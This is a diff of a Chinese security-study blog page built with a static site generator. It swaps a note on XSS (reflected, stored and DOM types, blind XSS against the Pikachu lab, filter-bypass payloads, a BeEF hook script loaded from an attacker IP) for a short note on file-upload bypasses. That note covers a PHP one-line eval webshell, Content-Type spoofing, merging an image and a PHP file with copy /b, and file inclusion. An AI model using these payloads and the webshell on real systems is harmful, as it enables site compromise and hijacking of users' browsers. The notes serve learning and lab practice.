@@ -19,25 +19,20 @@
   <meta name="author" content="FHK_KMD6377">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞-XSSCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：    1.反射性XSS;  &#x3D;&gt; 交互的数据一般不会被存在数据库中,恶意脚本请求中传入,服务器响应中返回,所见即所得,一次性    2.存储型XSS;  &#x3D;&gt; 交互的数据存在数据库中,永久性存储,比如">
+    <meta name="description" content="比如我想要上传一句话木马 1.php&#96; 校验在前端先上传一个正常的图片并抓包,把POST请求体内容改成一句话木马 MIME类型只支持上传MIME类型的(MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。) 绕过方案: 抓包,改变http报文中Content-Type请求头,改成支持的文件格式比如image&#x2F;png 真-只能上传图片后端使用了getimagesi">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FHK_KMD终晨">
-<meta property="og:url" content="http://example.com/2024/09/23/%E6%BC%8F%E6%B4%9E-XSS/index.html">
+<meta property="og:url" content="http://example.com/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="FHK_KMD终晨">
-<meta property="og:description" content="漏洞-XSSCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：    1.反射性XSS;  &#x3D;&gt; 交互的数据一般不会被存在数据库中,恶意脚本请求中传入,服务器响应中返回,所见即所得,一次性    2.存储型XSS;  &#x3D;&gt; 交互的数据存在数据库中,永久性存储,比如">
+<meta property="og:description" content="比如我想要上传一句话木马 1.php&#96; 校验在前端先上传一个正常的图片并抓包,把POST请求体内容改成一句话木马 MIME类型只支持上传MIME类型的(MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。) 绕过方案: 抓包,改变http报文中Content-Type请求头,改成支持的文件格式比如image&#x2F;png 真-只能上传图片后端使用了getimagesi">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240224123110.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240308091004.png">
-<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240308091013.png">
-<meta property="og:image" content="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png">
-<meta property="og:image" content="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png">
-<meta property="og:image" content="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png">
-<meta property="og:image" content="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png">
-<meta property="article:published_time" content="2024-09-23T13:13:40.044Z">
-<meta property="article:modified_time" content="2024-09-23T13:13:40.045Z">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240302205344.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240302205356.png">
+<meta property="article:published_time" content="2024-09-23T13:13:38.372Z">
+<meta property="article:modified_time" content="2024-09-23T13:13:38.372Z">
 <meta property="article:author" content="FHK_KMD6377">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240224123110.png">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240302205344.png">
   
   
   
@@ -230,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k wörter
+          247 wörter
         
       </span>
     
@@ -241,7 +236,7 @@
         
         
         
-          12 minuten
+          3 minuten
         
       </span>
     
@@ -283,30 +278,12 @@
             
               <div class="markdown-body">
                 
-                <h2 id="漏洞-XSS"><a href="#漏洞-XSS" class="headerlink" title="漏洞-XSS"></a>漏洞-XSS</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;  &#x3D;&gt; 交互的数据一般不会被存在数据库中,恶意脚本请求中传入,服务器响应中返回,所见即所得,一次性<br>    2.存储型XSS;  &#x3D;&gt; 交互的数据存在数据库中,永久性存储,比如一些留言板,评论<br>    3.DOM型XSS; &#x3D;&gt; 不与后端服务器产生数据交互,是一种通过DOM操作前端数据输出的时候产生的问题</p>
-<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>简单来讲就是在浏览器里面输入<code>&lt;script&gt;xxxx&lt;\script&gt;</code>脚本块,被当成js代码执行了</p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><img src="/images/Pasted%20image%2020240224123110.png" srcset="/img/loading.gif" lazyload><br>如图所示,输入的内容会显示在下面,如果在里面输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,那么就会执行alert(1)<br>假如此时输入框做了输入长度的限制,那么可以在url参数中写,绕过限制</p>
-<h4 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h4><p>浏览器的输入通过get传递给后端,再由后端传回来显示在浏览器上.<br>这时攻击者C启动beef-xss,先模拟用户登录网站,在输入框输入hook代码<code>&lt;script src=&quot;http://&lt;C的ip&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>,再到beef的webUI界面<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F,%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F,%E9%82%A3%E4%B9%88%E5%B0%B1%E6%8A%8A%E6%AD%A4%E6%97%B6%E7%9A%84url(%E6%90%BA%E5%B8%A6%E6%9C%89%E7%94%A8%E6%88%B7%E4%BB%A3%E7%A0%81)%E5%8F%91%E9%80%81%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85,%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB%E8%BF%9E%E6%8E%A5,%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B0%B1%E8%A2%AB%E5%8A%AB%E6%8C%81%E4%BA%86">http://127.0.0.1:3000/ui/panel检查是否成功,如果成功,那么就把此时的url(携带有用户代码)发送给受害者,受害者点击连接,浏览器的信息就被劫持了</a></p>
-<h4 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h4><p>浏览器的输入通过post传递给后端,输入的内容不会被显示在url中,此时可以抓包,在参数那里写<code>&lt;script&gt;xxxx&lt;\script&gt;</code>代码</p>
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>这个就是你存进去之后别人访问到这个页面也会有这个效果</p>
-<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。<br>例如</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM Based XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xsstest</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;input&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">50</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;xsstest()&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p>
-<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>xss盲打并不是xss漏洞的一种类型，而是xss漏洞的一个应用场景，主要是针对网站的后台管理员。<br>打开pukachu的xss盲打在输入框累随意输入一些字符点击提交，我们可以发现输入的结果并没有显示在前端，而是直接提交到后端管理员页面。<br> 如果我们输入一段js代码，由于是直接提交到后端管理员页面，用户前端并不会执行。<br> <img src="/images/Pasted%20image%2020240308091004.png" srcset="/img/loading.gif" lazyload><br><img src="/images/Pasted%20image%2020240308091013.png" srcset="/img/loading.gif" lazyload><br>我们在输入框输入<code>&lt;script&gt;alert(&#39;6666&#39;)&lt;/script&gt;</code>,然后提交，再点右上角的提示登入pikachuxss盲打的管理员后台；<br>我们会发现弹出了弹窗，说明我们盲打成功；xss盲打其实是一种尝试性的攻击行为，因为攻击者并不知道后台有没有输出或者是过滤；<br>xss盲打本质还是存储型xss漏洞的利用只不是后台输出端由用户变成了网站管理员，但是危害性就更大了。</p>
-<h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><p>xss绕过-过滤-转换</p>
-<p>例子：<br>1.前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。所以安全措施尽量不要放在前端。<br>2.大小写，比如<code>&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;</code>。如果过滤措施只对小写做了处理，我们就可以通过大写的输入来绕过他的措施，大写的输入被输出前端时仍然会被正常的执行。<br>3.双写（拼凑），<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code>。会去除敏感标签如<code>&lt;script&gt;</code>但可能只会去除一次<br>4.注释干扰，<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;。在前端输出时注释是不会被执行的</code><br>xss绕过-过滤-编码</p>
-<p>后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤，当浏览器对该标签进行识别时，会翻译成正常的标签，从而执行。（ps：使用编码要注意编码在输出点是否会被正常识别和翻译）</p>
-<p>实验演示：</p>
-<p>打开pikachu的xss之过滤，输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>点提交</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png" srcset="/img/loading.gif" lazyload></a></p>
-<p>没有弹窗弹出</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png" srcset="/img/loading.gif" lazyload></a></p>
-<p> 接着我们查看页面源码</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png" srcset="/img/loading.gif" lazyload></a></p>
-<p> 可以看到我们输入的标签都被去掉了，说明后台有对<code>&lt;script&gt;</code>标签进行过滤</p>
-<p>接下来我们使用大小写混合的方法输入<code>&lt;SCrIPT&gt;alert(1)&lt;/ScRiPt&gt;</code></p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png" srcset="/img/loading.gif" lazyload></a></p>
-<p> 成功弹窗，说明我们成功绕过了过滤，他的过滤措施并没有对大小写过滤。</p>
+                <p>比如我想要上传一句话木马 1.php<br>&#96;<?php eval($_POST[1];?></p>
+<h3 id="校验在前端"><a href="#校验在前端" class="headerlink" title="校验在前端"></a>校验在前端</h3><p>先上传一个正常的图片并抓包,把POST请求体内容改成一句话木马</p>
+<h3 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h3><p>只支持上传MIME类型的(MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。)</p>
+<p>绕过方案: 抓包,改变http报文中Content-Type请求头,改成支持的文件格式比如image&#x2F;png<br><img src="/images/Pasted%20image%2020240302205344.png" srcset="/img/loading.gif" lazyload><br><img src="/images/Pasted%20image%2020240302205356.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="真-只能上传图片"><a href="#真-只能上传图片" class="headerlink" title="真-只能上传图片"></a>真-只能上传图片</h3><p>后端使用了getimagesize()函数,它会正儿八经地检验文件格式,所以只能上传文件.</p>
+<p>绕过:<br>准备一个图片和一个一句话木马,使用命令行合并文件<br>cmd执行 <code>copy 上传的图片.png /b + 木马文件.php /a 最终合并的文件名.png</code><br>将最后合并的文件上传<br>然后使用文件包含漏洞,包含这个文件(注意先用..&#x2F;..&#x2F;探测出文件相对于根目录所在位置)</p>
 
                 
               </div>
@@ -325,7 +302,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div></div>
-      <div>http://example.com/2024/09/23/漏洞-XSS/</div>
+      <div>http://example.com/2024/09/23/漏洞-文件上传/</div>
     </div>
     <div class="license-meta">
       
@@ -369,7 +346,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/09/23/%E6%BC%8F%E6%B4%9E-XEE/" title="">
+                      <a href="/2024/09/23/%E6%BC%8F%E6%B4%9E-XSS/" title="">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile"></span>
                         <span class="visible-mobile">Vorheriger</span>
@@ -379,7 +356,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="">
+                      <a href="/2024/09/23/%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="">
                         <span class="hidden-mobile"></span>
                         <span class="visible-mobile">Nächster</span>
                         <i class="iconfont icon-arrowright"></i>
